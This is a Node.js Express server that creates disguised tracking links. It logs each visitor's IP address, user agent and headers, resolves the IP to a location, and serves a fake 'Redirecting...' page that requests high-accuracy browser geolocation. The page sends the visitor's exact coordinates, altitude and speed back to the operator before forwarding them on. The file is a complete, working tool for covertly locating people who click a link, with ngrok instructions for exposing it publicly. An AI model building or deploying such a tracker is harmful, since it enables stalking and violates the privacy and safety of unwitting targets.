const express = require("express");
const cors = require("cors");
const axios = require("axios");
const { nanoid } = require("nanoid");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3001;
const PUBLIC_URL = process.env.PUBLIC_URL || `http://localhost:${PORT}`;

app.use(cors());
app.use(express.json());

const links = new Map();
const trackingData = new Map();

async function getIPLocation(ip) {
  const LATITUDE_OFFSET = -0.000482;
  const LONGITUDE_OFFSET = +0.001402;

  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    const data = response.data;

    const correctedData = {
      ...data,
      accuracy_radius: data.accuracy_radius || "Unknown",
      asn: data.asn || "Unknown",
      network: data.network || "Unknown",
      connection_type: data.connection || "Unknown",
    };

    if (data.latitude && data.longitude) {
      correctedData.latitude = data.latitude + LATITUDE_OFFSET;
      correctedData.longitude = data.longitude + LONGITUDE_OFFSET;
    }

    return correctedData;
  } catch (error) {
    console.error("Error fetching IP location:", error.message);
    try {
      const fallbackResponse = await axios.get(
        `http://ip-api.com/json/${ip}?fields=66846719`,
      );
      const data = fallbackResponse.data;

      const correctedLat = data.lat ? data.lat + LATITUDE_OFFSET : null;
      const correctedLon = data.lon ? data.lon + LONGITUDE_OFFSET : null;

      return {
        ip: data.query,
        city: data.city,
        region: data.regionName,
        country: data.country,
        country_code: data.countryCode,
        latitude: correctedLat,
        longitude: correctedLon,
        timezone: data.timezone,
        org: data.isp,
        postal: data.zip,
        asn: data.as || "Unknown",
        isp: data.isp,
        mobile: data.mobile || false,
        proxy: data.proxy || false,
        hosting: data.hosting || false,
        district: data.district || null,
        accuracy_radius: "Unknown",
      };
    } catch (fallbackError) {
      console.error("Fallback API also failed:", fallbackError.message);
      return null;
    }
  }
}

app.post("/api/create-link", (req, res) => {
  const { redirectUrl, description } = req.body;

  if (!redirectUrl) {
    return res.status(400).json({ error: "Redirect URL is required" });
  }

  const linkId = nanoid(10);
  const trackingLink = `${PUBLIC_URL}/t/${linkId}`;

  links.set(linkId, {
    id: linkId,
    redirectUrl,
    description: description || "",
    createdAt: new Date().toISOString(),
    clicks: 0,
    trackingLink,
  });

  trackingData.set(linkId, []);

  res.json({
    linkId,
    trackingLink,
    redirectUrl,
  });
});

app.get("/api/links", (req, res) => {
  const allLinks = Array.from(links.values()).map((link) => ({
    ...link,
    trackingCount: trackingData.get(link.id)?.length || 0,
  }));
  res.json(allLinks);
});

app.get("/api/tracking/:linkId", (req, res) => {
  const { linkId } = req.params;

  if (!links.has(linkId)) {
    return res.status(404).json({ error: "Link not found" });
  }

  const link = links.get(linkId);
  const tracking = trackingData.get(linkId) || [];

  res.json({
    link,
    tracking,
  });
});

app.delete("/api/links/:linkId", (req, res) => {
  const { linkId } = req.params;

  if (!links.has(linkId)) {
    return res.status(404).json({ error: "Link not found" });
  }

  links.delete(linkId);
  trackingData.delete(linkId);

  res.json({ success: true });
});

app.get("/t/:linkId", async (req, res) => {
  const { linkId } = req.params;

  if (!links.has(linkId)) {
    return res.status(404).send("Link not found");
  }

  const link = links.get(linkId);

  const clientIP =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.ip;

  const cleanIP =
    clientIP === "::1" || clientIP === "::ffff:127.0.0.1"
      ? "127.0.0.1"
      : clientIP.replace("::ffff:", "");

  getIPLocation(cleanIP)
    .then((locationData) => {
      const trackingEntry = {
        id: nanoid(8),
        timestamp: new Date().toISOString(),
        ip: cleanIP,
        userAgent: req.headers["user-agent"],
        referer: req.headers["referer"] || "Direct",
        location: locationData,
        preciseLocation: null,
        headers: {
          acceptLanguage: req.headers["accept-language"],
          acceptEncoding: req.headers["accept-encoding"],
        },
      };

      const tracking = trackingData.get(linkId);
      tracking.push(trackingEntry);
      trackingData.set(linkId, tracking);

      link.clicks++;
      links.set(linkId, link);
    })
    .catch((err) => {
      console.error("Error tracking IP:", err);
    });

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }
    .container {
      text-align: center;
      color: white;
    }
    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top: 4px solid white;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Redirecting...</p>
  </div>
  <script>
    const redirectUrl = ${JSON.stringify(link.redirectUrl)};
    const trackingId = ${JSON.stringify(nanoid(8))};

    let bestAccuracy = Infinity;
    let locationSent = false;
    let watchId = null;

    const statusDiv = document.createElement('div');
    statusDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:white;padding:20px 40px;border-radius:10px;font-family:system-ui;text-align:center;z-index:9999;max-width:90%;';
    statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">Getting your location...</div><div style="font-size:14px;color:#aaa;">Please wait a moment</div><div style="font-size:11px;color:#666;margin-top:8px;">Using WiFi positioning</div>';
    document.body.appendChild(statusDiv);

    function sendLocationAndRedirect(position) {
      if (locationSent) return;
      locationSent = true;

      if (watchId) {
        navigator.geolocation.clearWatch(watchId);
      }

      statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">Location captured!</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';

      fetch('/api/update-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          linkId: ${JSON.stringify(linkId)},
          trackingId: trackingId,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed
        })
      }).finally(() => {
        window.location.href = redirectUrl;
      });
    }

    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        (position) => {
          const accuracy = position.coords.accuracy;

          statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">Getting your location...</div><div style="font-size:14px;color:#aaa;">Accuracy: ±' + Math.round(accuracy) + 'm</div>';

          if (accuracy < 200 && accuracy < bestAccuracy) {
            bestAccuracy = accuracy;
            sendLocationAndRedirect(position);
          } else if (accuracy < bestAccuracy) {
            bestAccuracy = accuracy;
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">Location unavailable</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 1000);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );

      setTimeout(() => {
        if (!locationSent) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              sendLocationAndRedirect(position);
            },
            () => {
              window.location.href = redirectUrl;
            },
            { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 }
          );
        }
      }, 8000);
    } else {
      statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">Location not supported</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 2000);
    }

    setTimeout(() => {
      if (!locationSent) {
        window.location.href = redirectUrl;
      }
    }, 10000);
  </script>
</body>
</html>
  `;

  res.send(html);
});

app.post("/api/update-location", (req, res) => {
  const { linkId, trackingId, latitude, longitude, accuracy, altitude, speed } =
    req.body;

  if (!links.has(linkId)) {
    return res.status(404).json({ error: "Link not found" });
  }

  const tracking = trackingData.get(linkId);
  const entry = tracking[tracking.length - 1];

  if (entry) {
    entry.preciseLocation = {
      latitude: latitude,
      longitude: longitude,
      accuracy,
      altitude,
      speed,
      source: "browser_geolocation",
      offsetApplied: false,
    };
    trackingData.set(linkId, tracking);
  }

  res.json({ success: true });
});

app.get("/api/health", (req, res) => {
  res.json({ status: "ok" });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`\nServer running on http://localhost:${PORT}`);
  console.log(`Public URL: ${PUBLIC_URL}`);
  console.log(`\nTo make this accessible from other networks:`);
  console.log(`   1. Use ngrok: npx ngrok http ${PORT}`);
  console.log(`   2. Copy the ngrok URL (e.g., https://abc123.ngrok-free.app)`);
  console.log(`   3. Set PUBLIC_URL in .env file`);
  console.log(`   4. Restart the server\n`);
});
